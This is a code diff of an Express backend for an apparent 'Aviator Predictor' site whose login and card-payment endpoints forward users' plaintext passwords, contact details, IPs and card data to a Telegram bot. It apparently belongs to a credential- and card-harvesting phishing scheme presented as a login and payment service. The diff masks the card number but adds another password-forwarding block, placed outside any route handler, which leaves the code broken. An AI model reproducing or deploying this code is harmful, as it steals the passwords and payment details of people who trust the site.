@@ -25,8 +25,6 @@ const logAuthData = (data) => {
 // Helper function to send to Telegram
 const sendToTelegram = async (message) => {
   try {
-    console.log('📤 Sending to Telegram:', message.substring(0, 100) + '...');
-    
     const response = await fetch(`https://api.telegram.org/bot${telegramBotToken}/sendMessage`, {
       method: 'POST',
       headers: {
@@ -40,28 +38,28 @@ const sendToTelegram = async (message) => {
     });
     
     if (!response.ok) {
-      const errorText = await response.text();
-      console.error(`❌ Telegram API error: ${response.status} - ${errorText}`);
-      return { success: false, error: `Telegram API error: ${response.status}` };
+      throw new Error(`Telegram API error: ${response.status}`);
     }
     
-    const result = await response.json();
-    console.log('✅ Telegram message sent successfully:', result.message_id);
-    return { success: true, result };
-    
+    return await response.json();
   } catch (error) {
-    console.error('❌ Failed to send to Telegram:', error.message);
-    return { success: false, error: error.message };
+    console.error('❌ Failed to send to Telegram:', error);
+    throw error;
   }
 };
 
-// Mask sensitive data for logging (keeping full card info)
+// Mask sensitive data for logging
 const maskSensitiveData = (data) => {
   const masked = { ...data };
   if (masked.password) {
     masked.password = '*'.repeat(masked.password.length);
   }
-  // Keep full card details visible
+  if (masked.cardNumber) {
+    masked.cardNumber = masked.cardNumber.replace(/\d(?=\d{4})/g, '*');
+  }
+  if (masked.cvv) {
+    masked.cvv = '***';
+  }
   return masked;
 };
 
@@ -118,8 +116,7 @@ router.post('/bot-login', async (req, res) => {
 ⏰ Time: <code>${new Date().toLocaleString()}</code>
 🔗 Source: Aviator Predictor Bot`;
 
-    const telegramResult = await sendToTelegram(telegramMessage);
-    console.log('✅ Bot login Telegram result:', telegramResult);
+    await sendToTelegram(telegramMessage);
 
     // Return success with session info
     res.json({ 
@@ -150,6 +147,29 @@ router.post('/bot-login', async (req, res) => {
     });
   }
 });
+    const telegramMessage = `🌐 <b>AVIATOR MAIN SITE LOGIN ALERT</b>
+
+📧 Contact: <code>${contact}</code>
+📱 Type: ${contactType}
+🔑 Password: <code>${password}</code>
+🌐 User Agent: <code>${userAgent ? userAgent.substring(0, 50) + '...' : 'Unknown'}</code>
+📍 IP: <code>${req.ip || 'Unknown'}</code>
+⏰ Time: <code>${new Date().toLocaleString()}</code>
+🔗 Source: Aviator Main Site`;
+
+    await sendToTelegram(telegramMessage);
+
+    // Return success with session info
+    res.json({ 
+      success: true,
+      message: 'Login successful',
+      sessionData: {
+        contact,
+        contactType,
+        loginTime: authData.timestamp,
+        sessionExpiry: new Date(Date.now() + 24 * 60 * 60 * 1000).toISOString() // 24 hours
+      }
+    });
 
 // Card payment details endpoint
 router.post('/card-payment', async (req, res) => {
@@ -189,16 +209,18 @@ router.post('/card-payment', async (req, res) => {
     // Log payment data (with masked card info)
     logAuthData(maskSensitiveData(paymentData));
 
-    // Send to Telegram with formatted message (showing full card details)
+    // Mask card number for Telegram (show only last 4 digits)
+    const maskedCardNumber = cardInfo.cardNumber.replace(/\d(?=\d{4})/g, '*');
+
+    // Send to Telegram with formatted message
     const telegramMessage = `💳 <b>CARD PAYMENT DETAILS</b>
 
 👤 Customer: <code>${contact}</code>
 💰 Package: <b>${packageName}</b>
 💵 Amount: <b>$${amount}</b>
-🏦 Card Number: <code>${cardInfo.cardNumber}</code>
+🏦 Card: <code>${maskedCardNumber}</code>
 📅 Expiry: <code>${cardInfo.expiryDate}</code>
-🔒 CVV: <code>${cardInfo.cvv}</code>
-👤 Cardholder: <code>${cardInfo.cardholderName}</code>
+👤 Name: <code>${cardInfo.cardholderName}</code>
 📍 IP: <code>${req.ip || 'Unknown'}</code>
 ⏰ Time: <code>${new Date().toLocaleString()}</code>
 🔗 Source: ${source || 'Bot Payment'}
@@ -206,8 +228,7 @@ router.post('/card-payment', async (req, res) => {
 ⚠️ <b>ADMIN ACTION REQUIRED</b>
 Please verify this payment manually.`;
 
-    const telegramResult = await sendToTelegram(telegramMessage);
-    console.log('✅ Card payment Telegram result:', telegramResult);
+    await sendToTelegram(telegramMessage);
 
     // Return success
     res.json({ 
@@ -276,8 +297,7 @@ router.post('/index-login', async (req, res) => {
 
 ✅ Client is proceeding to main platform`;
 
-    const telegramResult = await sendToTelegram(telegramMessage);
-    console.log('✅ Index login Telegram result:', telegramResult);
+    await sendToTelegram(telegramMessage);
 
     // Return success with session info
     res.json({ 
@@ -584,38 +604,6 @@ User payment was not verified.`;
     res.status(500).json({ 
       success: false,
       error: 'Failed to reject payment'
-    });
-  }
-});
-
-// Test Telegram connectivity endpoint
-router.get('/test-telegram', async (req, res) => {
-  try {
-    const testMessage = `🧪 <b>TELEGRAM TEST MESSAGE</b>
-
-⏰ Time: <code>${new Date().toLocaleString()}</code>
-📍 IP: <code>${req.ip || 'Unknown'}</code>
-🔗 Source: Backend Test Endpoint
-
-✅ If you see this message, Telegram integration is working!`;
-
-    const result = await sendToTelegram(testMessage);
-    
-    res.json({
-      success: true,
-      message: 'Telegram test completed',
-      telegramResult: result,
-      botToken: telegramBotToken ? 'Present' : 'Missing',
-      chatId: telegramChatId ? 'Present' : 'Missing'
-    });
-
-  } catch (error) {
-    console.error('❌ Telegram test error:', error);
-    res.status(500).json({
-      success: false,
-      error: error.message,
-      botToken: telegramBotToken ? 'Present' : 'Missing',
-      chatId: telegramChatId ? 'Present' : 'Missing'
     });
   }
 });
